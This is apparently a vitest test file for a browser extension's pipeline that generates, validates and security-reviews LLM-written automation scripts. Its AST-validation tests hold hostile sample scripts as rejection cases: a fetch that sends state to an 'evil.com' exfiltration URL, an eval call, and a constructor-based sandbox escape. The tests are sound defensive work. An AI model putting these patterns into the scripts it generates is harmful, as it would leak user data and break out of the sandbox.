/**
 * Tests for the task creation pipeline.
 *
 * Verifies the end-to-end flow:
 * 1. Observe page (GET_A11Y_TREE + SCREENSHOT)
 * 2. Generate script (LLM call in side panel)
 * 3. AST validation
 * 4. Security review (dual-model)
 * 5. Test script execution
 * 6. Create task (save to IndexedDB + schedule)
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';
import 'fake-indexeddb/auto';
import { openDB } from './db';
import { getTask, getScriptVersionsForTask, getTaskState } from './db-helpers';
import { validateAST } from './security/ast-validator';
import { generateScript, cleanScriptSource, type ExplorationResult } from './explorer';
import { securityReview } from './security/security-review';
import { MessageRouter } from './message-router';
import { putTask, putScriptVersion, putTaskState } from './db-helpers';
import type { Task, ScriptVersion } from '../types/index';

// ---------------------------------------------------------------------------
// Chrome API mocks
// ---------------------------------------------------------------------------
function setupChromeMock() {
  (globalThis as any).chrome = {
    runtime: {
      onMessage: { addListener: vi.fn() },
      sendMessage: vi.fn(),
      getURL: vi.fn((path: string) => `chrome-extension://test/${path}`),
    },
    storage: {
      local: {
        get: vi.fn(async () => ({})),
        set: vi.fn(async () => {}),
      },
    },
    tabs: {
      get: vi.fn(async (tabId: number) => ({
        id: tabId,
        url: 'https://example.com/products',
        title: 'Example Products',
        windowId: 1,
      })),
      sendMessage: vi.fn(async () => ({
        tree: [
          { role: 'heading', name: 'Products', refId: 'ref-1' },
          { role: 'link', name: 'iPhone 16', refId: 'ref-2' },
          { role: 'generic', name: '$999', refId: 'ref-3' },
        ],
      })),
      captureVisibleTab: vi.fn(async () => 'data:image/png;base64,screenshot'),
      query: vi.fn(async () => [{ id: 1, url: 'https://example.com' }]),
    },
    alarms: {
      create: vi.fn(async () => {}),
      clear: vi.fn(async () => true),
    },
    notifications: {
      create: vi.fn(async () => ''),
    },
  };
}

let db: IDBDatabase;

beforeEach(async () => {
  indexedDB = new IDBFactory();
  setupChromeMock();
  db = await openDB();
});

// ---------------------------------------------------------------------------
// AST Validation tests for generated scripts
// ---------------------------------------------------------------------------

describe('AST validation for task scripts', () => {
  it('approves a valid price monitoring script', () => {
    const script = `
      async function run(page, context) {
        await page.goto(context.url);
        await page.waitForLoadState('domcontentloaded');
        const price = await page.locator('.price').textContent();
        const prev = context.state.lastPrice;
        if (prev && price !== prev) {
          await context.notify('Price changed: ' + prev + ' -> ' + price);
        }
        context.state.lastPrice = price;
        return { price };
      }
    `;
    const result = validateAST(script);
    expect(result.valid).toBe(true);
    expect(result.errors).toHaveLength(0);
  });

  it('rejects a script using eval', () => {
    const script = `
      async function run(page, context) {
        eval('alert("hacked")');
      }
    `;
    const result = validateAST(script);
    expect(result.valid).toBe(false);
    expect(result.errors.some(e => e.includes('eval'))).toBe(true);
  });

  it('rejects a script using fetch', () => {
    const script = `
      async function run(page, context) {
        const data = await fetch('https://evil.com/exfil?data=' + context.state);
      }
    `;
    const result = validateAST(script);
    expect(result.valid).toBe(false);
  });

  it('rejects a script accessing constructor', () => {
    const script = `
      async function run(page, context) {
        const fn = [].filter.constructor('return this')();
      }
    `;
    const result = validateAST(script);
    expect(result.valid).toBe(false);
  });

  it('approves a script using getByRole', () => {
    const script = `
      async function run(page, context) {
        await page.getByRole('button', 'Submit').click();
        return { submitted: true };
      }
    `;
    const result = validateAST(script);
    expect(result.valid).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Clean script source tests
// ---------------------------------------------------------------------------

describe('Script source cleaning', () => {
  it('strips markdown code fences', () => {
    const raw = '```javascript\nasync function run(page) {\n  return 42;\n}\n```';
    expect(cleanScriptSource(raw)).toBe('async function run(page) {\n  return 42;\n}');
  });

  it('preserves clean scripts', () => {
    const raw = 'async function run(page) {\n  return 42;\n}';
    expect(cleanScriptSource(raw)).toBe(raw);
  });
});

// ---------------------------------------------------------------------------
// Task creation pipeline integration
// ---------------------------------------------------------------------------

describe('Task creation via CREATE_TASK handler', () => {
  it('creates task with script version and state', async () => {
    const router = new MessageRouter();

    router.on('CREATE_TASK', async (msg: any) => {
      await putTask(db, msg.task);
      if (msg.scriptSource) {
        const sv: ScriptVersion = {
          id: `${msg.task.id}:v1`,
          taskId: msg.task.id,
          version: 1,
          source: msg.scriptSource,
          checksum: 'test',
          generatedBy: 'explorer',
          astValidationPassed: true,
          securityReviewPassed: true,
          reviewDetails: [],
          createdAt: new Date().toISOString(),
        };
        await putScriptVersion(db, sv);
      }
      await putTaskState(db, {
        taskId: msg.task.id,
        state: {},
        updatedAt: new Date().toISOString(),
      });
      return { ok: true as const };
    });

    const taskId = 'task-pipeline-test';
    const scriptSource = `
      async function run(page, context) {
        await page.goto('https://example.com');
        return { visited: true };
      }
    `;

    await router.handleMessage({
      type: 'CREATE_TASK',
      task: {
        id: taskId,
        name: 'Visit Example',
        description: 'Visit example.com and confirm',
        allowedDomains: ['example.com'],
        schedule: { type: 'manual' },
        activeScriptVersion: 1,
        disabled: false,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
      scriptSource,
    } as any, {} as any);

    // Verify task was created
    const task = await getTask(db, taskId);
    expect(task).toBeDefined();
    expect(task!.name).toBe('Visit Example');
    expect(task!.activeScriptVersion).toBe(1);

    // Verify script version was created
    const versions = await getScriptVersionsForTask(db, taskId);
    expect(versions).toHaveLength(1);
    expect(versions[0].source).toContain('page.goto');
    expect(versions[0].version).toBe(1);

    // Verify state was initialized
    const state = await getTaskState(db, taskId);
    expect(state).toBeDefined();
    expect(state!.state).toEqual({});
  });

  it('creates task with interval schedule', async () => {
    const router = new MessageRouter();

    router.on('CREATE_TASK', async (msg: any) => {
      await putTask(db, msg.task);
      await putTaskState(db, {
        taskId: msg.task.id,
        state: {},
        updatedAt: new Date().toISOString(),
      });
      return { ok: true as const };
    });

    await router.handleMessage({
      type: 'CREATE_TASK',
      task: {
        id: 'task-scheduled',
        name: 'Scheduled Task',
        description: 'Runs every 30 minutes',
        allowedDomains: ['example.com'],
        schedule: { type: 'interval', intervalMinutes: 30 },
        activeScriptVersion: 1,
        disabled: false,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
    } as any, {} as any);

    const task = await getTask(db, 'task-scheduled');
    expect(task).toBeDefined();
    expect(task!.schedule).toEqual({ type: 'interval', intervalMinutes: 30 });
  });

  it('creates task without script source (user-uploaded)', async () => {
    const router = new MessageRouter();

    router.on('CREATE_TASK', async (msg: any) => {
      await putTask(db, msg.task);
      await putTaskState(db, {
        taskId: msg.task.id,
        state: {},
        updatedAt: new Date().toISOString(),
      });
      return { ok: true as const };
    });

    const result = await router.handleMessage({
      type: 'CREATE_TASK',
      task: {
        id: 'task-no-script',
        name: 'No Script Task',
        description: 'Task without script',
        allowedDomains: ['example.com'],
        schedule: { type: 'manual' },
        activeScriptVersion: 1,
        disabled: false,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
    } as any, {} as any);

    expect(result).toEqual({ ok: true });

    // Task should exist but no script versions
    const task = await getTask(db, 'task-no-script');
    expect(task).toBeDefined();
    const versions = await getScriptVersionsForTask(db, 'task-no-script');
    expect(versions).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// Security review mock tests
// ---------------------------------------------------------------------------

describe('Security review integration', () => {
  it('dual review approves safe script', async () => {
    const mockClient = {
      chat: vi.fn(async () => JSON.stringify({ approved: true, issues: [] })),
      stream: vi.fn(),
      modelName: 'test-model',
    } as any;

    const result = await securityReview(
      'async function run(page) { await page.goto("https://example.com"); }',
      [mockClient, mockClient],
    );

    expect(result.approved).toBe(true);
    expect(result.details).toHaveLength(2);
  });

  it('dual review rejects when one model rejects', async () => {
    const approveClient = {
      chat: vi.fn(async () => JSON.stringify({ approved: true, issues: [] })),
      modelName: 'approver',
    } as any;

    const rejectClient = {
      chat: vi.fn(async () => JSON.stringify({
        approved: false,
        issues: ['Detects potential data exfiltration'],
      })),
      modelName: 'rejector',
    } as any;

    const result = await securityReview(
      'async function run(page) { /* suspicious */ }',
      [approveClient, rejectClient],
    );

    expect(result.approved).toBe(false);
  });

  it('fails closed on LLM error', async () => {
    const errorClient = {
      chat: vi.fn(async () => { throw new Error('API error'); }),
      modelName: 'error-model',
    } as any;

    const result = await securityReview(
      'async function run(page) {}',
      [errorClient, errorClient],
    );

    expect(result.approved).toBe(false);
    expect(result.details[0].issues[0]).toContain('Review error');
  });

  it('fails closed on malformed response', async () => {
    const badClient = {
      chat: vi.fn(async () => JSON.stringify({ wrong: 'format' })),
      modelName: 'bad-model',
    } as any;

    const result = await securityReview(
      'async function run(page) {}',
      [badClient, badClient],
    );

    expect(result.approved).toBe(false);
    expect(result.details[0].issues[0]).toContain('Malformed');
  });
});

// ---------------------------------------------------------------------------
// Full pipeline simulation
// ---------------------------------------------------------------------------

describe('Full task creation pipeline', () => {
  it('simulates wizard flow: observe → generate → validate → review → create', async () => {
    // 1. Observe page
    const observation: ExplorationResult = {
      a11yTree: JSON.stringify([
        { role: 'heading', name: 'Amazon Product' },
        { role: 'generic', name: '$99.99', attributes: { 'data-testid': 'price' } },
      ]),
      url: 'https://www.amazon.com/product/123',
      title: 'Amazon Product Page',
    };

    // 2. Generate script (simulated LLM response)
    const generatedSource = `
async function run(page, context) {
  await page.goto(context.url);
  await page.waitForLoadState('domcontentloaded');
  const price = await page.locator('[data-testid="price"]').textContent();
  context.state.lastPrice = price;
  return { price };
}
    `.trim();

    // 3. AST validation
    const astResult = validateAST(generatedSource);
    expect(astResult.valid).toBe(true);

    // 4. Security review (mocked)
    const mockReviewClient = {
      chat: vi.fn(async () => JSON.stringify({ approved: true, issues: [] })),
      modelName: 'gpt-5.4',
    } as any;

    const reviewResult = await securityReview(
      generatedSource,
      [mockReviewClient, mockReviewClient],
    );
    expect(reviewResult.approved).toBe(true);

    // 5. Create task
    const taskId = 'task-pipeline-full';
    const task: Task = {
      id: taskId,
      name: 'Monitor Amazon price',
      description: 'Track price changes for Amazon product',
      allowedDomains: ['amazon.com', 'www.amazon.com'],
      schedule: { type: 'interval', intervalMinutes: 60 },
      activeScriptVersion: 1,
      disabled: false,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };

    await putTask(db, task);
    await putScriptVersion(db, {
      id: `${taskId}:v1`,
      taskId,
      version: 1,
      source: generatedSource,
      checksum: 'abc123',
      generatedBy: 'explorer',
      astValidationPassed: astResult.valid,
      securityReviewPassed: reviewResult.approved,
      reviewDetails: reviewResult.details,
      createdAt: new Date().toISOString(),
    });
    await putTaskState(db, {
      taskId,
      state: {},
      updatedAt: new Date().toISOString(),
    });

    // Verify everything was saved correctly
    const savedTask = await getTask(db, taskId);
    expect(savedTask!.name).toBe('Monitor Amazon price');
    expect(savedTask!.schedule).toEqual({ type: 'interval', intervalMinutes: 60 });

    const versions = await getScriptVersionsForTask(db, taskId);
    expect(versions).toHaveLength(1);
    expect(versions[0].astValidationPassed).toBe(true);
    expect(versions[0].securityReviewPassed).toBe(true);
    expect(versions[0].source).toContain('page.locator');

    const state = await getTaskState(db, taskId);
    expect(state!.state).toEqual({});
  });
});
